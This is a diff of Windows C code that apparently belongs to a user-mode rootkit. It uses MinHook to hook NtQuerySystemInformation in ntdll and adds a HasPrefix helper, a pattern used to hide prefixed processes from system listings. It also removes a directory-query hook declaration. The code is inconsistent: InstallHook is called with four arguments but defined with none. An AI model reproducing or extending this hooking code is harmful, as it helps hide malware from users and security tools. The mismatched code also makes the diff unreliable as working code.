@@ -12,57 +12,12 @@
 fnNtQuerySystemInformation originalNtQuery;
 fnNtQuerySystemInformation newNtQuery;
 
-fnNtQueryDirectoryFile originalNtQueryDir;
-fnNtQueryDirectoryFile newNtQueryDir;
-
-    
-    InstallHook("NtQuerySystemInformation", &originalNtQuery, &hookedNtQuery, &newNtQuery);
-
-
-
-
 VOID InitHooks() {
 
     MH_Initialize();
-    InstallHook(NtQuerySystemInformation_CRC32, &originalNtQuery, &hookedNtQuery, &newNtQuery);
-    
+    InstallHook("NtQuerySystemInformation", &originalNtQuery, &hookedNtQuery, &newNtQuery);
+
 }
-
-
-BOOL InstallHook(/*LPCSTR function, LPVOID* originalFunction, LPVOID* hookedFunction, LPVOID* newFunction*/) {
-
-    //*originalFunction = GetProcAddress(GetModuleHandle(L"NTDLL"), function);
-    originalNtQuery = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
-
-    if (MH_Initialize() != MH_OK) {
-        return FALSE;
-    }
-
-    if (MH_CreateHook(originalNtQuery, &hookedNtQuery, &newNtQuery) != MH_OK) {
-        return FALSE;
-    }
-
-    if (MH_EnableHook(originalNtQuery) != MH_OK) {
-        return FALSE;
-    }
-
-    return TRUE;
-}
-
-BOOL UnHook() {
-
-    if (MH_DisableHook(originalNtQuery) != MH_OK) {
-        return FALSE;
-    }
-
-    if (MH_Uninitialize() != MH_OK) {
-        return FALSE;
-    }
-
-    return TRUE;
-}
-
-
 
 NTSTATUS WINAPI hookedNtQuery(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
     NTSTATUS stat = newNtQuery(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
@@ -91,7 +46,37 @@ NTSTATUS WINAPI hookedNtQuery(SYSTEM_INFORMATION_CLASS SystemInformationClass, P
 }
 
 
+BOOL InstallHook() {
 
+    originalNtQuery = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
+
+    if (MH_Initialize() != MH_OK) {
+        return FALSE;
+    }
+    
+    if (MH_CreateHook(originalNtQuery, &hookedNtQuery, &newNtQuery) != MH_OK) {
+        return FALSE;
+    }
+
+    if (MH_EnableHook(originalNtQuery) != MH_OK) {
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+BOOL UnHook() {
+
+    if (MH_DisableHook(originalNtQuery) != MH_OK) {
+        return FALSE;
+    }
+
+    if (MH_Uninitialize() != MH_OK) {
+        return FALSE;
+    }
+
+    return TRUE;
+}
 
 
 BOOL HasPrefix(LPCWSTR str)
